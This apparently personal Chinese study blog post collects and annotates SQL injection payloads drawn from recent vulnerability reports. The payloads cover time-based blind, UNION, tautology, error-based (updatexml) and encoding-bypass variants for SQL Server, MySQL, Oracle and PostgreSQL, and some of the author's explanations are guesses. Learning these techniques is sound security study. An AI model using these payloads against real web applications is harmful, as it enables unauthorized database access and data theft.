---
title: sql语句积累
datas: 2024.8.25
updated: 2024年8月25日
tags:
  - 工具
categories: 工具
keywords:
description: 工具
---



昨天刚重修完基本的sql注入的，今天看了看2023-2024的一些暴出来的sql漏洞，学习一下师傅们的注入手法，积累一下注入语句🤭

-- 真的，不看不知道，一看真的是惊讶于师傅们的手法，真的，一个永真都玩出花了，果然我就是一个菜鸡
~~确信.jpg~~

# Sql Server
```WAITFOR DELAY
1' WAITFOR DELAY '0:0:5'--
waitfor 有两种用法
waitfor time  '10:01:01'指定10点1分2秒时执行
waitfor delay '01:02:03'指定等待1小时2分钟3秒后执行

```

![](https://pic.imgdb.cn/item/66cbd054d9c307b7e9d65a0b.png)

像是这个，就是一个延时注入的


# MySql
```union all
union all


1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL

union all联合注入，需要注意的是munion all操作用于结合两个或更多 SELECT 语句的结果集，包括所有匹配的行，甚至包括重复的行，但是union会默认删除重复的行
```
```联合注入
联合注入

联合注入亦可以进行这样的
action=GetDetail&status=300&id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2885%29%2BCHAR%28122%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28120%29%2BCHAR%2888%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28122%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2868%29%2BCHAR%2871%29%2BCHAR%2866%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%2890%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28117%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28100%29%2BCHAR%28111%29%2BCHAR%28118%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28111%29%2BCHAR%2877%29%2BCHAR%2890%29%2BCHAR%28105%29%2BCHAR%28103%29%2BCHAR%28111%29%2BCHAR%2880%29%2BCHAR%28106%29%2BCHAR%2869%29%2BCHAR%2887%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+BUHl

中间的经过url解码以后就是
action=GetDetail&status=300&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(122)+CHAR(113)+CHAR(85)+CHAR(122)+CHAR(83)+CHAR(113)+CHAR(90)+CHAR(120)+CHAR(88)+CHAR(103)+CHAR(86)+CHAR(122)+CHAR(76)+CHAR(81)+CHAR(68)+CHAR(71)+CHAR(66)+CHAR(104)+CHAR(72)+CHAR(117)+CHAR(90)+CHAR(112)+CHAR(106)+CHAR(117)+CHAR(105)+CHAR(65)+CHAR(100)+CHAR(111)+CHAR(118)+CHAR(119)+CHAR(119)+CHAR(119)+CHAR(111)+CHAR(77)+CHAR(90)+CHAR(105)+CHAR(103)+CHAR(111)+CHAR(80)+CHAR(106)+CHAR(69)+CHAR(87)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--+BUHl

提取char就是qpzzqUzSqZxXgVzLQDGBhHuZpjuiAdovwwwoMZigoPjEWqjkzq，这样绕过了对qpzzqUzSqZxXgVzLQDGBhHuZpjuiAdovwwwoMZigoPjEWqjkzq的限制
```
```永真
永真

1 OR 3*2*1=6 AND 000322=000322&order=desc&request=watch&sort=Id&view=request
这个我猜测可能是因为限制了1=1这个，随意当初打出来的师傅才进行了or 3*2*1=6 and 000322=000322

2' AND 6205=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(66)||CHR(90)||CHR(108),8)--
2'：在 SQL 查询中，这个部分可能是用来闭合之前的字符串或条件。
AND 6205=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(66)||CHR(90)||CHR(108),8)：在这里，通过构造一个条件，尝试调用 DBMS_PIPE.RECEIVE_MESSAGE 函数。这个函数用于从管道中接收消息，参数是一个由字符值拼接而成的字符串。
CHR(98)||CHR(66)||CHR(90)||CHR(108)：这部分是 Oracle SQL 中用来生成字符的函数，将字符的 ASCII 值转换为字符本身。在这里，拼接的字符可能是 "bBZl"。

'and 1=user::integer--
1=user::integer 可能是尝试将一个整数等于另一个整数，这里是 1 等于用户 user 的整数值。

1','10',(select+@`,'`+or+if(1=0,1,(select+~0+1))+limit+0,1))--+'

'1','10',(select @','：在这里，逗号可能用于分隔不同字段或参数。'1' 可能是用来闭合之前的字符串，'10' 可能是一个参数。
+or+if(1=0,1,(select ~0+1))+limit+0,1))--+'：这是尝试执行 SQL 注入攻击的关键部分：
+or+if(1=0,1,(select ~0+1))：构造一个条件，如果 1 等于 0，则返回 1，否则执行 select ~0+1，可能是为了检测条件是否成立。
limit 0,1：在某些数据库中，LIMIT 语句用于限制结果集的返回行数。
--+'：注释掉后续语句，确保注入部分不会破坏整个查询。

```

```延时
延时

AND (SELECT 4802 FROM (SELECT(SLEEP(5)))ndMq) AND 'NEoX'='NEoX
我有点疑惑这个为啥要嵌套一个，是为了让里面的select (sleep(5))先执行吗？

 "'XOR(if(now()=sysdate(),sleep(5),0))XOR'"
里面好像是做了一个判断，检查当前时间是否等于系统日期，如果相等，则执行 sleep(5)，即让查询暂停 5 秒钟，否则返回 0

?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289765%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1

我在里面还看到了这么一个的，就是一个条件判断语句 CASE WHEN (9765=9765) THEN '' ELSE (SELECT 7700 UNION SELECT 3389) END：在这里，根据条件判断，如果 9765 等于 9765，则返回空字符串，否则返回一个联合查询结果集 (7700) UNION (3389)。

(SELECT 4655 FROM (SELECT(SLEEP(5)))usQE

4655：在这个语句中，4655 只是一个随机的数字，通常用作测试载荷，没有实际意义，只是用于检查应用程序是否执行了预期的操作或是否存在漏洞。
SLEEP(5)：SLEEP(5) 是一个 MySQL 的函数，会使查询暂停执行 5 秒钟。在这里，它被用作一个时间延迟函数，用来测试应用程序对时间延迟攻击（基于时间的盲注）的防护性能。
usQE：usQE 可能只是一个命名，没有特定含义，主要是作为查询的别名或标识符使用。
```


```MD5
MD5

action=detailInfo&fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--

这段代码的目的是：

通过 HASHBYTES('MD5','123') 对字符串 '123' 进行 MD5 哈希处理。
正常来说,hash转换以后是一串16进制数字，这里用sys.fn_sqlvarbasetostr将哈希后的结果转换为字符串。
使用 SUBSTRING 函数从第三个字符开始提取长度为 32 的子字符串。
最后，尝试执行一个逻辑比较，判断提取的子字符串是否小于 0。

```
```报错
报错

?updatexml(1,concat(0x7e,user(),0x7e),1)=1
正统报错注入，所以这个是师傅updatexml=1是吗

1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1)

好吧这才是正统的

url解码
1 and updatexml(1,concat(0x7e,version(),0x7e),1)


updatexml(1,concat(0x5c,md5(123456),0x5c),1) 这部分代码尝试将目标节点的内容设置为 '\md5(123456)\'
concat连接
0x5c解码\，就是把1替换成\md5(123456)\

```


# PostgreSql

```PG_SLEEP
PG_SLEEP

就是mysql中的sleep
admin');SELECT PG_SLEEP(5)--

```


最终也没看完人家的整个漏洞库，看了大概有一半吧，魂飞了，这是里面出现的各种师傅的注入手法，也是挺新奇的，只能说，孩子太菜了还是带学啊